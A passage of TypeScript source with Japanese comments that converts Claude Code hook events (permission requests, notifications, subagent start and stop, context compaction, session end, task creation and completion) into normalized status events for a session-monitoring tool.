    case "PermissionRequest": {
      const toolName = asString(input.tool_name) ?? "unknown";
      const toolInput = (input.tool_input ?? {}) as ToolInput;
      const kind = classifyTool(toolName);
      const payload: Record<string, unknown> = { tool_name: toolName };
      if (kind === "bash" && toolInput.command) {
        payload.command = summarize(asString(toolInput.command) ?? "", MAX_COMMAND_LEN);
        payload.risk_level = classifyCommandRisk(asString(toolInput.command) ?? "");
      }
      if (kind === "edit" && toolInput.file_path) payload.path = toolInput.file_path;
      if (ctx.approvalRequestId) payload.request_id = ctx.approvalRequestId;
      return [
        make("tool.permission.requested", "waiting.approval", {
          summary: `承認待ち: ${toolName}${toolInput.command ? ` (${summarize(asString(toolInput.command) ?? "", 60)})` : ""}`,
          payload,
        }),
      ];
    }

    case "Notification": {
      const ntype = asString(input.notification_type);
      const message = asString(input.message) ?? "";
      if (ntype === "permission_prompt") {
        return [
          make("heartbeat", "waiting.approval", {
            summary: `承認プロンプト: ${summarize(message, 80)}`,
            payload: { process_alive: true },
          }),
        ];
      }
      if (ntype === "idle_prompt") {
        return [
          make("heartbeat", "waiting.user_input", {
            summary: "入力待ち",
            payload: { process_alive: true },
          }),
        ];
      }
      // auth_success 等は状態変更なしの軽量 heartbeat。
      return [
        make("heartbeat", undefined, {
          summary: `通知: ${ntype ?? "notification"}`,
          payload: { process_alive: true },
        }),
      ];
    }

    // INV-SUBAGENT-BOUNDARY: subagent.started/completed は **agent_type が非空のときだけ** emit する。
    // 公式 hooks 仕様では Subagent{Start,Stop} は 1 サブエージェントにつき 1 回ずつ agent_type 付きで
    // 発火する。だが --agent / --fork-session / 常駐 daemon の spare/slash で起動された session 自身の
    // 停止は、**対応する SubagentStart の無い** agent_type 空の SubagentStop を発火させる
    // (実データ ~/.actradeck/sidecar.db: 空 agent_type の completed 67/67 が start と非相関、
    //  named 109/109 が agent_id で start と 1:1 相関)。これを completed 化すると started≠completed と
    // なり「稼働中サブエージェント数」がアンダーフローしうる。空/欠落は境界でなく heartbeat 化する。
    case "SubagentStart": {
      const agentType = nonEmptyString(input.agent_type);
      if (agentType === undefined) {
        return [
          make("heartbeat", undefined, {
            summary: "通知: subagent start (agent_type 無し)",
            payload: { process_alive: true },
          }),
        ];
      }
      return [
        make("subagent.started", undefined, {
          summary: `サブエージェント開始: ${agentType}`,
          payload: { task: agentType, agent_type: agentType },
        }),
      ];
    }

    case "SubagentStop": {
      const agentType = nonEmptyString(input.agent_type);
      if (agentType === undefined) {
        return [
          make("heartbeat", undefined, {
            summary: "通知: subagent stop (agent_type 無し)",
            payload: { process_alive: true },
          }),
        ];
      }
      return [
        make("subagent.completed", undefined, {
          summary: `サブエージェント完了: ${agentType}`,
          payload: { agent_type: agentType },
        }),
      ];
    }

    case "PreCompact": {
      const trigger = asString(input.trigger);
      return [
        make("context.compacted", "compacting", {
          summary: `コンテキスト圧縮 (${trigger ?? "auto"})`,
          payload: { trigger: trigger === "manual" ? "manual" : "auto" },
        }),
      ];
    }

    case "PostCompact": {
      return [
        make("heartbeat", "running.model_wait", {
          summary: "圧縮完了 → 作業再開",
          payload: { process_alive: true },
        }),
      ];
    }

    case "Stop": {
      return [
        make("turn.completed", "idle", {
          summary: "ターン完了",
          payload: {},
        }),
      ];
    }

    case "SessionEnd": {
      const reason = asString(input.reason) ?? "other";
      // ADR 0014 Phase 3b-1 (D4): SessionEnd reason → EndKind closed-enum gate。state は既存どおり
      //   "completed" (terminal・全 reason 一律) を維持し end_kind で終端種別を細別する。recoverability は
      //   terminalContinuation(state) 単一出所を再利用 (手書き分岐を置かない・completed→not_resumable)。
      const endKind = endKindForSessionEndReason(reason);
      const recoverability = terminalContinuation("completed");
      return [
        make("session.ended", "completed", {
          summary: `セッション終了 (${reason})`,
          payload: { reason },
          endKind,
          ...(recoverability !== undefined ? { recoverability } : {}),
        }),
      ];
    }

    // ADR 0015 §D2 (B2): CC の task-list 専用 semantic hook → work.item.updated (fidelity=observed)。
    //   live 検証 (2026-08-04・CC 2.1.220) の 8 field payload から parse する (未検証 field は parse しない):
    //     {session_id, transcript_path, cwd, prompt_id, hook_event_name, task_id, task_subject,
    //      task_description}。TaskCreated は生成 (status=pending)、TaskCompleted は完了 (status=completed)。
    //   provider_task_id = task_id (session-scoped serial "1"・fold が key=(session_id, work_item_id))。
    //   PostToolUse parse と同一 provider_task_id ゆえ fold が 1 work item に畳む (§D5・受入 6)。
    //   state は載せない (INV-WORKITEM-NO-STATE・§D1: 純観測で session 状態機械を動かさない)。
    case "TaskCreated": {
      const taskId = nonEmptyString(input.task_id);
      if (taskId === undefined) {
        // task_id 欠落 = 同定不能。落とさず観測事実のみ heartbeat 化 (work item は作らない)。
        return [
          make("heartbeat", undefined, {
            summary: "通知: TaskCreated (task_id 無し)",
            payload: { process_alive: true },
          }),
        ];
      }
      const subject = workItemText(input.task_subject);
      const description = workItemText(input.task_description);
      return [
        make("work.item.updated", undefined, {
          summary: `作業項目 作成: ${subject ?? taskId}`,
          payload: workItemPayload(taskId, "pending", subject, description, "observed"),
        }),
      ];
    }

    case "TaskCompleted": {
      const taskId = nonEmptyString(input.task_id);
      if (taskId === undefined) {
        return [
          make("heartbeat", undefined, {
            summary: "通知: TaskCompleted (task_id 無し)",
            payload: { process_alive: true },
          }),
        ];
      }
      const subject = workItemText(input.task_subject);
      const description = workItemText(input.task_description);
      return [
        make("work.item.updated", undefined, {
          summary: `作業項目 完了: ${subject ?? taskId}`,
          payload: workItemPayload(taskId, "completed", subject, description, "observed"),
        }),
      ];
    }

    default:
      // 未対応 hook も観測の事実として heartbeat 化 (落とさず可視化)。
      return [
        make("heartbeat", undefined, {
          summary: `hook: ${input.hook_event_name}`,
          payload: { process_alive: true },
        }),
      ];
  }
}
